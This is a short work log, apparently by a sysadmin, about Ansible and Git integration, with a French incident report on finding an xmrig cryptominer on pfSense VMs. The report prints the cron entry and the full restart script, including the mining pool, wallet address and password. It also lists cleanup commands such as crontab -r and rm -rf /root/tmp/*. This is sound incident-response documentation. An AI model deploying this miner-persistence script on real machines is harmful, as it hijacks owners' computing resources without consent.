Morning :
Planned integration of ansible and git inside our VM, though about the CI/CD pipelin needed to make it automatic.
Reviewed som PR
Started ansible and git integration

Afternoon : 
Continued ansible and git integration
started to add rules and ssh keys needed on differents machines
Spotted a suspicious process running on our pfsense vms
Investigated then removed it

With :
Bonjour,
Nous avons constaté qu'il y avait sur nos pfsense un processus xmrig qui tournait et chargeait notre usage processeur.
 
 
Après petite enquête, le 19 Janvier avait été déposé sur la VM un fichier zip contenant le script, xmrig et un fichier de config.json
 
 
Il y avait un cron job qui appelait le script check_xmrig.sh
 
[2.8.1-RELEASE][admin@pfSense.home.arpa]/root: crontab -l * * * * * /root/tmp/check_xmrig.sh [2.8.1-RELEASE][admin@pfSense.home.arpa]/root: cat /root/tmp/check_xmrig.sh if ! pgrep -x "xmrig" > /dev/null then     echo "$(date): xmrig is not running, starting..."     /root/tmp/xmrig --url pool.hashvault.pro:3333 --user 49knXPN8HcmGKj5RskYLJkKNtPS4x8uVVALmYnL182ziGvNNSuHxauTSckc2p1xj8iFsHqeGhCdTqGqyGzCnCrvqNd5praC --pass test0110p0f --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 & else     echo "$(date): xmrig is already running." fi
 
Donc nous avons, supprimer le cronjob avec crontab -r, kill le processus pkill xmrig et enfin supprimé les fichiers avec rm -rf /root/tmp/* 
 
Après observation sur chacune des vm avec top le processus ne semble pas s'être relancé.